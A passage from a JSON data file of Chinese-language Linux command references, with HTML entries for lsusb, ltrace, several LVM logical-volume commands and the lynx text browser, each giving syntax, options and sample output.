        "body": "<h1 id=\"lsusb\">lsusb</h1>\n<p>显示本机的USB设备列表信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lsusb命令</strong> 用于显示本机的USB设备列表，以及USB设备的详细信息。</p>\n<p>lsusb命令是一个学习USB驱动开发，认识USB设备的助手，推荐大家使用，如果您的开发板中或者产品中没有lsusb命令可以自己移植一个，放到文件系统里面。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lsusb</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：显示USB设备的详细信息；</span>\n<span class=\"hljs-deletion\">-s&lt;总线：设备号&gt;仅显示指定的总线和（或）设备号的设备；</span>\n<span class=\"hljs-deletion\">-d&lt;厂商：产品&gt;：仅显示指定厂商和产品编号的设备；</span>\n<span class=\"hljs-deletion\">-t：以树状结构显示无理USB设备的层次；</span>\n<span class=\"hljs-deletion\">-V：显示命令的版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>插入usb鼠标后执行lsusb的输出内容如下:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Bus</span> <span class=\"hljs-number\">005</span> Device <span class=\"hljs-number\">001</span>: id <span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span> \n<span class=\"hljs-attribute\">Bus</span> <span class=\"hljs-number\">001</span> Device <span class=\"hljs-number\">001</span>: ID <span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span> \n<span class=\"hljs-attribute\">Bus</span> <span class=\"hljs-number\">004</span> Device <span class=\"hljs-number\">001</span>: ID <span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span> \n<span class=\"hljs-attribute\">Bus</span> <span class=\"hljs-number\">003</span> Device <span class=\"hljs-number\">001</span>: ID <span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span> \n<span class=\"hljs-attribute\">Bus</span> <span class=\"hljs-number\">002</span> Device <span class=\"hljs-number\">006</span>: ID <span class=\"hljs-number\">15</span>d9:<span class=\"hljs-number\">0</span>a37 \n<span class=\"hljs-attribute\">Bus</span> <span class=\"hljs-number\">002</span> Device <span class=\"hljs-number\">001</span>: ID <span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span> \n</code></pre>\n<p>解释：</p>\n<p> <strong>Bus 005</strong> </p>\n<p>表示第五个usb主控制器(机器上总共有5个usb主控制器 -- 可以通过命令lspci | grep USB查看)</p>\n<p> <strong>Device 006</strong> </p>\n<p>表示系统给usb鼠标分配的设备号(devnum)，同时也可以看到该鼠标是插入到了第二个usb主控制器</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-number\">006</span>        usb_device.devnum\n<span class=\"hljs-regexp\">/sys/</span>devices<span class=\"hljs-regexp\">/pci0000:00/</span><span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">1</span>d.<span class=\"hljs-number\">1</span><span class=\"hljs-regexp\">/usb2/</span><span class=\"hljs-number\">2</span>-<span class=\"hljs-number\">2</span>/devnum\n</code></pre>\n<p> <strong>ID 15d9:0a37</strong> </p>\n<p>表示usb设备的ID（这个ID由芯片制造商设置，可以唯一表示该设备）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-number\">15</span>d9    usb_device_descriptor.idVendor\n<span class=\"hljs-number\">0</span>a37    usb_device_descriptor.idProduct\n<span class=\"hljs-regexp\">/sys/</span>devices<span class=\"hljs-regexp\">/pci0000:00/</span><span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">1</span>d.<span class=\"hljs-number\">1</span><span class=\"hljs-regexp\">/usb2/</span><span class=\"hljs-number\">2</span>-<span class=\"hljs-number\">2</span>/idVendor\n</code></pre>\n<p><strong>Bus 002 Device 006: ID 15d9:0a37<br>Bus 002 Device 001: ID 0000:0000</strong></p>\n<p>表示002号usb主控制器上接入了两个设备:</p>\n<ul>\n<li>一个是usb根Hub -- 001&nbsp;</li>\n<li>一个是usb鼠标&nbsp; -- 006</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ltrace",
        "des": "用来跟踪进程调用库函数的情况",
        "body": "<h1 id=\"ltrace\">ltrace</h1>\n<p>用来跟踪进程调用库函数的情况</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ltrace命令</strong> 是用来跟踪进程调用库函数的情况。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ltrace <span class=\"hljs-comment\">[option ...]</span> <span class=\"hljs-comment\">[command <span class=\"hljs-comment\">[arg ...]</span>]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a 对齐具体某个列的返回值。</span>\n<span class=\"hljs-deletion\">-c 计算时间和调用，并在程序退出时打印摘要。</span>\n<span class=\"hljs-deletion\">-C 解码低级别名称（内核级）为用户级名称。</span>\n<span class=\"hljs-deletion\">-d 打印调试信息。</span>\n<span class=\"hljs-deletion\">-e 改变跟踪的事件。</span>\n<span class=\"hljs-deletion\">-f 跟踪子进程。</span>\n<span class=\"hljs-deletion\">-h 打印帮助信息。</span>\n<span class=\"hljs-deletion\">-i 打印指令指针，当库调用时。</span>\n<span class=\"hljs-deletion\">-l 只打印某个库中的调用。</span>\n<span class=\"hljs-deletion\">-L 不打印库调用。</span>\n<span class=\"hljs-deletion\">-n, --indent=NR 对每个调用级别嵌套以NR个空格进行缩进输出。</span>\n<span class=\"hljs-deletion\">-o, --output=file 把输出定向到文件。</span>\n<span class=\"hljs-deletion\">-p PID 附着在值为PID的进程号上进行ltrace。</span>\n<span class=\"hljs-deletion\">-r 打印相对时间戳。</span>\n<span class=\"hljs-deletion\">-s STRLEN 设置打印的字符串最大长度。</span>\n<span class=\"hljs-deletion\">-S 显示系统调用。</span>\n<span class=\"hljs-deletion\">-t, -tt, -ttt 打印绝对时间戳。</span>\n<span class=\"hljs-deletion\">-T 输出每个调用过程的时间开销。</span>\n<span class=\"hljs-deletion\">-u USERNAME 使用某个用户id或组ID来运行命令。</span>\n<span class=\"hljs-deletion\">-V, --version 打印版本信息，然后退出。</span>\n<span class=\"hljs-deletion\">-x NAME treat the global NAME like a library subroutine.（求翻译）</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>最基本应用，不带任何参数：</p>\n<pre><code class=\"language-shell\">[guest@localhost tmp]$ ltrace ./a.out\n__libc_start_main(<span class=\"hljs-number\">0x80484aa</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0xbfc07744</span>, <span class=\"hljs-number\">0x8048550</span>, <span class=\"hljs-number\">0x8048540</span> &lt;unfinished ...&gt;\n<span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"no1:%d \\t no2:%d \\t diff:%d\\n\"</span>, <span class=\"hljs-number\">10</span>, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">4</span>no1:<span class=\"hljs-number\">10</span> no2:<span class=\"hljs-number\">6</span> diff:<span class=\"hljs-number\">4</span> ) = <span class=\"hljs-number\">24</span>\n<span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"no1:%d \\t no2:%d \\t diff:%d\\n\"</span>, <span class=\"hljs-number\">9</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">2</span>no1:<span class=\"hljs-number\">9</span> no2:<span class=\"hljs-number\">7</span> diff:<span class=\"hljs-number\">2</span> ) = <span class=\"hljs-number\">23</span>\n<span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"no1:%d \\t no2:%d \\t diff:%d\\n\"</span>, <span class=\"hljs-number\">8</span>, <span class=\"hljs-number\">8</span>, 0no1:<span class=\"hljs-number\">8</span> no2:<span class=\"hljs-number\">8</span> diff:<span class=\"hljs-number\">0</span> ) = <span class=\"hljs-number\">23</span>\n--- SIGFPE (Floating point exception) ---\n+++ killed by SIGFPE +++\n</code></pre>\n<p>输出调用时间开销：</p>\n<pre><code class=\"language-shell\">[guest@localhost tmp]$ ltrace -T ./a.out\n__libc_start_main(<span class=\"hljs-number\">0x80484aa</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0xbf81d394</span>, <span class=\"hljs-number\">0x8048550</span>, <span class=\"hljs-number\">0x8048540</span> &lt;unfinished ...&gt;\n<span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"no1:%d \\t no2:%d \\t diff:%d\\n\"</span>, <span class=\"hljs-number\">10</span>, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">4</span>no1:<span class=\"hljs-number\">10</span> no2:<span class=\"hljs-number\">6</span> diff:<span class=\"hljs-number\">4</span> ) = <span class=\"hljs-number\">24</span> &lt;<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">000</span>972&gt;\n<span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"no1:%d \\t no2:%d \\t diff:%d\\n\"</span>, <span class=\"hljs-number\">9</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">2</span>no1:<span class=\"hljs-number\">9</span> no2:<span class=\"hljs-number\">7</span> diff:<span class=\"hljs-number\">2</span> ) = <span class=\"hljs-number\">23</span> &lt;<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">000155</span>&gt;\n<span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"no1:%d \\t no2:%d \\t diff:%d\\n\"</span>, <span class=\"hljs-number\">8</span>, <span class=\"hljs-number\">8</span>, 0no1:<span class=\"hljs-number\">8</span> no2:<span class=\"hljs-number\">8</span> diff:<span class=\"hljs-number\">0</span> ) = <span class=\"hljs-number\">23</span> &lt;<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">000153</span>&gt;\n--- SIGFPE (Floating point exception) ---\n+++ killed by SIGFPE +++\n</code></pre>\n<p>显示系统调用：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[guest@localhost tmp]</span>$ ltrace -S ./<span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-class\">.out</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_brk</span><span class=\"hljs-params\">(NULL)</span></span> = <span class=\"hljs-number\">0</span>x9e20000\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_access</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>xa4710f, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">0</span>xa4afc0, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>xa4b644)</span></span> = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_open</span><span class=\"hljs-params\">(<span class=\"hljs-string\">\"/etc/ld.so.preload\"</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">02</span>)</span></span> = <span class=\"hljs-number\">3</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_fstat64</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>xbfbd7a94, <span class=\"hljs-number\">0</span>xa4afc0, -<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">3</span>)</span></span> = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_mmap2</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">17</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>)</span></span> = <span class=\"hljs-number\">0</span>xb7f2a000\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_close</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>)</span></span> = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_open</span><span class=\"hljs-params\">(<span class=\"hljs-string\">\"/lib/libcwait.so\"</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">00</span>)</span></span> = <span class=\"hljs-number\">3</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_read</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>, <span class=\"hljs-string\">\"\\177ELF\\001\\001\\001\"</span>, <span class=\"hljs-number\">512</span>)</span></span> = <span class=\"hljs-number\">512</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_fstat64</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>xbfbd76fc, <span class=\"hljs-number\">0</span>xa4afc0, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">0</span>xa4b658)</span></span> = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_mmap2</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">4096</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">34</span>, -<span class=\"hljs-number\">1</span>)</span></span> = <span class=\"hljs-number\">0</span>xb7f29000\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_mmap2</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">5544</span>, <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">2050</span>, <span class=\"hljs-number\">3</span>)</span></span> = <span class=\"hljs-number\">0</span>x423000\n<span class=\"hljs-function\"><span class=\"hljs-title\">SYS_mmap2</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x424000, <span class=\"hljs-number\">4096</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">2066</span>, <span class=\"hljs-number\">3</span>)</span></span> = <span class=\"hljs-number\">0</span>x424000\n.............省去若干行\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lvcreate",
        "des": "用于创建LVM的逻辑卷",
        "body": "<h1 id=\"lvcreate\">lvcreate</h1>\n<p>用于创建LVM的逻辑卷</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lvcreate命令</strong> 用于创建LVM的逻辑卷。逻辑卷是创建在卷组之上的。逻辑卷对应的设备文件保存在卷组目录下，例如：在卷组\"vg1000\"上创建一个逻辑卷\"lvol0\"，则此逻辑卷对应的设备文件为\"/dev/vg1000/lvol0\"。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lvcreate</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；</span>\n<span class=\"hljs-deletion\">-l：指定逻辑卷的大小（LE数）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>逻辑卷：指定要创建的逻辑卷名称。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用lvcreate命令在卷组\"vg1000\"上创建一个200MB的逻辑卷。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-attr\"># lvcreate -L 200</span>M v<span class=\"hljs-name\">g1000</span>    <span class=\"hljs-attr\">#创建大小为200</span>M的逻辑卷\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">Logical <span class=\"hljs-keyword\">volume</span><span class=\"language-bash\"> <span class=\"hljs-string\">\"lvol0\"</span> created</span>\n</code></pre>\n<p>说明：创建成功后，新的逻辑卷\"lvol0\"，将通过设备文件<code>/dev/vg1000/lvol0</code>进行访问。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lvdisplay",
        "des": "显示逻辑卷属性",
        "body": "<h1 id=\"lvdisplay\">lvdisplay</h1>\n<p>显示逻辑卷属性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lvdisplay命令</strong> 用于显示LVM逻辑卷空间大小、读写状态和快照信息等属性。如果省略\"逻辑卷\"参数，则lvdisplay命令显示所有的逻辑卷属性。否则，仅显示指定的逻辑卷属性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lvdisplay</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>逻辑卷：指定要显示属性的逻辑卷对应的设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用lvdisplay命令显示指定逻辑卷的属性。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># lvdisplay /dev/vg1000/lvol0     #显示逻辑卷属性</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">  <span class=\"hljs-params\">---</span> Logical volume <span class=\"hljs-params\">---</span>  \n  LV Name                <span class=\"hljs-string\">/dev/vg1000/lvol0</span>  \n<span class=\"hljs-string\">......</span>省略部分输出内容<span class=\"hljs-string\">......</span>  \n  Block device           253<span class=\"hljs-function\">:0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lvextend",
        "des": "扩展逻辑卷空间",
        "body": "<h1 id=\"lvextend\">lvextend</h1>\n<p>扩展逻辑卷空间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lvextend命令</strong> 用于在线扩展逻辑卷的空间大小，而不中断应用程序对逻辑卷的访问。使用lvextend命令动态在线扩展磁盘空间，整个空间扩展过程对于应用程序来说是完全透明的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lvextend</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；</span>\n<span class=\"hljs-deletion\">-l：指定逻辑卷的大小（LE数）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>逻辑卷：指定要扩展空间的逻辑卷。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用lvextend命令为逻辑卷<code>/dev/vg1000/lvol0</code>增加100M空间。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-attr\"># lvextend -L +100</span>M /dev/v<span class=\"hljs-name\">g1000</span>/lvol<span class=\"hljs-number\">0</span>    <span class=\"hljs-attr\">#为了解决增加100</span>M空间\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Extending</span> logical volume lvol0 to <span class=\"hljs-number\">300</span>.<span class=\"hljs-number\">00</span> MB  \n<span class=\"hljs-attribute\">Logical</span> volume lvol0 successfully resized\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lvreduce",
        "des": "收缩逻辑卷空间",
        "body": "<h1 id=\"lvreduce\">lvreduce</h1>\n<p>收缩逻辑卷空间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lvreduce命令</strong> 用于减少LVM逻辑卷占用的空间大小。使用lvreduce命令收缩逻辑卷的空间大小有可能会删除逻辑卷上已有的数据，所以在操作前必须进行确认。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lvreduce</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；</span>\n<span class=\"hljs-deletion\">-l：指定逻辑卷的大小（LE数）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>逻辑卷：指定要操作的逻辑卷对应的设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用lvreduce命令减少指定的逻辑卷的空间大小。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-attr\"># lvreduce -L -50</span>M /dev/v<span class=\"hljs-name\">g1000</span>/lvol<span class=\"hljs-number\">0</span>     <span class=\"hljs-attr\">#将逻辑卷的空间大小减少50</span>M\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-params\">...</span><span class=\"hljs-params\">...</span>省略部分输出内容<span class=\"hljs-params\">...</span><span class=\"hljs-params\">...</span>  \n<span class=\"hljs-keyword\">Do</span> you really want <span class=\"hljs-keyword\">to</span> reduce lvol0? <span class=\"hljs-meta\">[</span>y/n<span class=\"hljs-meta\">]</span>: y  #确认操作  \n  Reducing logical volume lvol0 to 252.00 MB  \n  Logical volume lvol0 successfully resized\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lvremove",
        "des": "删除指定LVM逻辑卷",
        "body": "<h1 id=\"lvremove\">lvremove</h1>\n<p>删除指定LVM逻辑卷</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lvremove命令</strong> 用于删除指定LVM逻辑卷。如果逻辑卷已经使用mount命令加载，则不能使用lvremove命令删除。必须使用umount命令卸载后，逻辑卷方可被删除。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lvremove</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：强制删除。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>逻辑卷：指定要删除的逻辑卷。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用lvremove命令删除指定的逻辑卷。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># lvremove /dev/vg1000/lvol0    #删除逻辑卷<span class=\"hljs-string\">\"lvol0\"</span></span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">Do</span> you really want <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">remove</span> active logical \nvolume <span class=\"hljs-string\">\"lvol0\"</span>? [y/n]: y    #确认删除\n  Logical volume <span class=\"hljs-string\">\"lvol0\"</span> successfully removed\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lvresize",
        "des": "调整逻辑卷空间大小",
        "body": "<h1 id=\"lvresize\">lvresize</h1>\n<p>调整逻辑卷空间大小</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lvresize命令</strong> 用于调整LVM逻辑卷的空间大小，可以增大空间和缩小空间。使用lvresize命令调整逻辑卷空间大小和缩小空间时需要谨慎，因为它有可能导致数据丢失。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lvresize</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；</span>\n<span class=\"hljs-deletion\">-l：指定逻辑卷的大小（LE数）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>逻辑卷：指定要删除的逻辑卷。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用lvresize命令调整最大的逻辑卷大小。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-attr\"># lvresize -L +200</span>M /dev/v<span class=\"hljs-name\">g1000</span>/lvol<span class=\"hljs-number\">0</span>     <span class=\"hljs-attr\">#将逻辑卷空间增加200</span>M\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Extending</span> logical volume lvol0 to <span class=\"hljs-number\">280</span>.<span class=\"hljs-number\">00</span> MB\n<span class=\"hljs-attribute\">Logical</span> volume lvol0 successfully resized\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lvscan",
        "des": "扫描逻辑卷",
        "body": "<h1 id=\"lvscan\">lvscan</h1>\n<p>扫描逻辑卷</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lvscan命令</strong> 用于扫描当前系统中存在的所有的LVM逻辑卷。使用lvscan指令可以发现系统中的所有逻辑卷，及其对应的设备文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lvscan</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">b</span>：显示逻辑卷的主设备和次设备号。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用lvscan命令扫描系统中的所有逻辑卷。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># lvscan     #扫描所有的逻辑卷</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">ACTIVE          <span class=\"hljs-string\">'/dev/vg1000/lvol0'</span> <span class=\"hljs-selector-attr\">[200.00 MB]</span> <span class=\"hljs-attribute\">inherit</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lynx",
        "des": "纯文本模式的网页浏览器",
        "body": "<h1 id=\"lynx\">lynx</h1>\n<p>纯文本模式的网页浏览器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lynx命令</strong> 是纯文本模式的网页浏览器，不支持图形、音视频等多媒体信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lynx</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-case：在搜索字符串时，区分大小写；</span>\n<span class=\"hljs-deletion\">-ftp：关闭ftp功能；</span>\n<span class=\"hljs-deletion\">-nobrowse：关闭目录浏览功能；</span>\n<span class=\"hljs-deletion\">-noclor：关闭色彩显示模式；</span>\n<span class=\"hljs-deletion\">-reload：更新代理服务器的缓存，只对首页有效；</span>\n<span class=\"hljs-deletion\">--color：如果系统支持彩色模式，则激活彩色模式；</span>\n<span class=\"hljs-deletion\">--help：显示指令的帮助信息；</span>\n<span class=\"hljs-deletion\">--versiom：显示指令的版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>URL：指定要访问的网站的URL地址。</p>\n<h2 id=\"内部命令\">内部命令</h2>\n<p> <strong>移动命令</strong> </p>\n<pre><code class=\"language-shell\">下方向键：页面上的下一个链接<span class=\"hljs-comment\">(用高亮度显示)</span>。\n上方向键：页面上的前一个链接<span class=\"hljs-comment\">(用高亮度显示)</span>。\n回车和右方向键：跳转到链接指向的地址。\n左方向键：回到上一个页面。\n</code></pre>\n<p> <strong>滚动命令</strong> </p>\n<pre><code class=\"language-shell\">+、Page-Down、Space、Ctrl+f：向下翻页。\n-、Page-Up、<span class=\"hljs-selector-tag\">b</span>、Ctrl+<span class=\"hljs-selector-tag\">b</span>：向上翻页。\nCtrl+<span class=\"hljs-selector-tag\">a</span>：移动到当前页的最前面。\nCtrl+e：移动到当前页的最后面。\nCtrl+n：向下翻两行。\nCtrl+<span class=\"hljs-selector-tag\">p</span>：往回翻两行。\n)：向下翻半页。\n(：往回翻半页。\n#：回到当前页的 Toolbar 或 Banner。\n</code></pre>\n<p> <strong>文件操作命令</strong> </p>\n<pre><code class=\"language-shell\">c：建立一个新文件。\nd：下载选中的文件。\nE：编辑选中的文件。\nf：为当前文件显示一个选项菜单。\nm：修改选中文件的名字或位置。\nr：删除选中的文件。\nt：<span class=\"hljs-keyword\">Tag</span> <span class=\"hljs-title\">highlighted</span> file。\nu：上载一个文件到当前目录。\n</code></pre>\n<p> <strong>其他命令</strong> </p>\n<pre><code class=\"language-shell\">?、h：帮助。\na：把当前链接加入到一个书签文件里。\nc：向页面的拥有者发送意见或建议。\nd：下载当前链接。\ne：编辑当前文件。\ng：跳转到一个用户 指定的URL或文件。\nG：编辑当前页的URL，并跳转到这个URL。\ni：显示文档索引。\nj：执行预先定义的“短”命令。\nk：显示键盘命令列表。\nl：列出当前页上所有链接的地址。\nm：回到首页 。\no：设置选项。\np：把当前页输出到文件，e-mail，打印机或其他地方。\nq：退出。\n/：在当前页内查找字符串。\ns：在外部搜索输入的字符串。\n<span class=\"hljs-built_in\">n</span>：搜索下一个。\nv：查看一个书签文件。\nV：跳转到访问过的地址。\nx：不使用缓存。\nz：停止当前传输。\n[backspace]：跳转到历史页(同 V 